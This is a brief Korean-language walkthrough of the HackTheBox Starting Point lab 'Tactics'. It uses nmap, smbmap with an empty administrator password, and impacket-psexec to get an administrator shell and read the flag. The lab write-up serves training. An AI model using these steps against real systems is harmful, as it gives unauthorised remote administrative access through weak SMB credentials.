# Tactics - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 135,139,445 -sC -sV -oA tactics -vv 10.129.8.242
```
<img width="763" height="427" alt="image" src="https://github.com/user-attachments/assets/23d0cdee-50ca-4ed1-9807-45b23a77e0b5" />

- SMB(445)

---
## SMB
- guest enumeration 실패
```bash
smbmap -u ‘’ -p ‘’ -H 10.129.8.242

smbmap -u ‘guest’ -p ‘’ -H 10.129.8.242
```

- 주어진 정보가 없어서 administrator로 enumeration 시도하여 성공.
```bash
smbmap -u administrator -p '' -H 10.129.8.242
```
<img width="960" height="133" alt="image" src="https://github.com/user-attachments/assets/6be7c8a0-535d-484f-9a84-f8ffd3ccd71f" />

---
## psexec
- `C$`와 `ADMIN$`에 읽고 쓸 수 있는 권한이 있어서 `impacket-psexec`를 사용하여 administrator로 셸 획득
```bash
impacket-psexec administrator@10.129.8.242
```
<img width="960" height="342" alt="image" src="https://github.com/user-attachments/assets/686b5e7e-b9f5-4593-9a51-144ecf939f55" />

<br>
<br>

- `c:\users\administrator\desktop`에서 flag 획득
<img width="960" height="269" alt="image" src="https://github.com/user-attachments/assets/3728b253-d04c-4c9e-bb11-01772379e64b" />

